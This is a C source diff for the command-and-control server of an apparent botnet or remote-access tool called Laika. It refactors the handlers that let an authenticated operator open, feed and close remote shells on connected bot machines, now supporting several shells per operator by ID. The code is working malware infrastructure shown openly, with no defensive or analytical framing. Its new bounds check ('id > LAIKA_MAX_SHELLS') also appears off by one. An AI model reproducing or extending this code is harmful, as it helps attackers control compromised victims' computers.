@@ -41,22 +41,6 @@ void laikaC_sendRmvPeer(struct sLaika_peer *authPeer, struct sLaika_peer *peer) 
     laikaS_endOutPacket(authPeer);
 }
 
-void laikaC_closeAuthShell(struct sLaika_peer *auth) {
-    struct sLaika_authInfo *aInfo = (struct sLaika_authInfo*)auth->uData;
-
-    if (!aInfo->shellBot)
-        return;
-
-    /* forward SHELL_CLOSE to bot */
-    laikaS_startOutPacket(aInfo->shellBot, LAIKAPKT_SHELL_CLOSE);
-    laikaS_writeInt(&aInfo->shellBot->sock, &aInfo->shellID, sizeof(uint32_t));
-    laikaS_endOutPacket(aInfo->shellBot);
-
-    /* rmv shell */
-    laikaC_rmvShell((struct sLaika_botInfo*)aInfo->shellBot->uData, auth);
-    aInfo->shellBot = NULL;
-}
-
 /* ============================================[[ Packet Handlers ]]============================================= */
 
 void laikaC_handleAuthenticatedHandshake(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
@@ -86,14 +70,10 @@ void laikaC_handleAuthenticatedHandshake(struct sLaika_peer *authPeer, LAIKAPKT_
 
 void laikaC_handleAuthenticatedShellOpen(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
     uint8_t pubKey[crypto_kx_PUBLICKEYBYTES];
-    struct sLaika_authInfo *aInfo = (struct sLaika_authInfo*)uData;
-    struct sLaika_cnc *cnc = aInfo->info.cnc;
+    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
+    struct sLaika_cnc *cnc = pInfo->cnc;
     struct sLaika_peer *peer;
     uint16_t cols, rows;
-
-    /* sanity check, make sure shell isn't already open */
-    if (aInfo->shellBot)
-        LAIKA_ERROR("laikaC_handleAuthenticatedShellOpen: Shell already open!\n");
 
     /* read pubkey & find peer */
     laikaS_read(&authPeer->sock, pubKey, crypto_kx_PUBLICKEYBYTES);
@@ -107,27 +87,23 @@ void laikaC_handleAuthenticatedShellOpen(struct sLaika_peer *authPeer, LAIKAPKT_
     laikaS_readInt(&authPeer->sock, &cols, sizeof(uint16_t));
     laikaS_readInt(&authPeer->sock, &rows, sizeof(uint16_t));
 
-    /* link shells */
-    aInfo->shellBot = peer;
-    aInfo->shellID = laikaC_addShell((struct sLaika_botInfo*)peer->uData, authPeer);
-
-    /* forward the request to open a shell */
-    laikaS_startOutPacket(peer, LAIKAPKT_SHELL_OPEN);
-    laikaS_writeInt(&peer->sock, &aInfo->shellID, sizeof(uint32_t));
-    laikaS_writeInt(&peer->sock, &cols, sizeof(uint16_t));
-    laikaS_writeInt(&peer->sock, &rows, sizeof(uint16_t));
-    laikaS_endOutPacket(peer);
+    /* open shell */
+    laikaC_openShell(peer, authPeer, cols, rows);
 }
 
 void laikaC_handleAuthenticatedShellClose(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
-    struct sLaika_authInfo *aInfo = (struct sLaika_authInfo*)uData;
-    struct sLaika_cnc *cnc = aInfo->info.cnc;
+    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
+    struct sLaika_cnc *cnc = pInfo->cnc;
+    struct sLaika_shellInfo *shell;
+    uint32_t id;
 
-    /* an AUTH_SHELL_CLOSE can be sent after the shell has already been closed, so don't error just ignore the packet */
-    if (aInfo->shellBot == NULL)
+    laikaS_readInt(&authPeer->sock, &id, sizeof(uint32_t));
+
+    /* ignore malformed packet */
+    if (id > LAIKA_MAX_SHELLS || (shell = pInfo->shells[id]) == NULL)
         return;
 
-    laikaC_closeAuthShell(authPeer);
+    laikaC_closeShell(shell);
 }
 
 /* improves readability */
@@ -139,16 +115,23 @@ void laikaC_handleAuthenticatedShellClose(struct sLaika_peer *authPeer, LAIKAPKT
 
 void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
     uint8_t data[LAIKA_SHELL_DATA_MAX_LENGTH];
-    struct sLaika_authInfo *aInfo = (struct sLaika_authInfo*)uData;
-    struct sLaika_cnc *cnc = aInfo->info.cnc;
+    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
+    struct sLaika_cnc *cnc = pInfo->cnc;
     struct sLaika_peer *peer;
+    struct sLaika_shellInfo *shell;
+    uint32_t id;
 
-    /* sanity check, make sure shell is open */
-    if ((peer = aInfo->shellBot) == NULL)
-        LAIKA_ERROR("laikaC_handleAuthenticatedShellData: Shell not open!\n");
+    if (sz-sizeof(uint32_t) > LAIKA_SHELL_DATA_MAX_LENGTH || sz <= sizeof(uint32_t))
+        LAIKA_ERROR("laikaC_handleAuthenticatedShellData: Wrong data size!\n");
 
-    if (sz > LAIKA_SHELL_DATA_MAX_LENGTH)
-        LAIKA_ERROR("laikaC_handleAuthenticatedShellData: Data too big!\n");
+    laikaS_readInt(&authPeer->sock, &id, sizeof(uint32_t));
+    sz -= sizeof(uint32_t);
+
+    /* ignore malformed packet */
+    if (id > LAIKA_MAX_SHELLS || (shell = pInfo->shells[id]) == NULL)
+        return;
+
+    peer = shell->bot;
 
     /* read data */
     laikaS_read(&authPeer->sock, data, sz);
@@ -161,12 +144,12 @@ void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_
             */
 
             /* first part */
-            SENDSHELLDATA(peer, data, sz-sizeof(uint32_t), &aInfo->shellID);
+            SENDSHELLDATA(peer, data, sz-sizeof(uint32_t), &shell->botShellID);
 
             /* second part */
-            SENDSHELLDATA(peer, data + (sz-sizeof(uint32_t)), sizeof(uint32_t), &aInfo->shellID);
+            SENDSHELLDATA(peer, data + (sz-sizeof(uint32_t)), sizeof(uint32_t), &shell->botShellID);
         } else {
-            SENDSHELLDATA(peer, data, sz, &aInfo->shellID);
+            SENDSHELLDATA(peer, data, sz, &shell->botShellID);
         }
     } else if (authPeer->osType == OS_LIN && peer->osType == OS_WIN) { /* convert data if its linux -> windows */
         uint8_t *buf = laikaM_malloc(sz);
@@ -190,12 +173,12 @@ void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_
             buffers > LAIKA_SHELL_DATA_MAX_LENGTH. so we send it in chunks) */
         i = count;
         while (i+sizeof(uint32_t) > LAIKA_SHELL_DATA_MAX_LENGTH) {
-            SENDSHELLDATA(peer, buf + (count - i), LAIKA_SHELL_DATA_MAX_LENGTH-sizeof(uint32_t), &aInfo->shellID);            
+            SENDSHELLDATA(peer, buf + (count - i), LAIKA_SHELL_DATA_MAX_LENGTH-sizeof(uint32_t), &shell->botShellID);            
             i -= LAIKA_SHELL_DATA_MAX_LENGTH;
         }
 
         /* send the leftovers */
-        SENDSHELLDATA(peer, buf + (count - i), i, &aInfo->shellID);
+        SENDSHELLDATA(peer, buf + (count - i), i, &shell->botShellID);
         laikaM_free(buf);
     }
 }
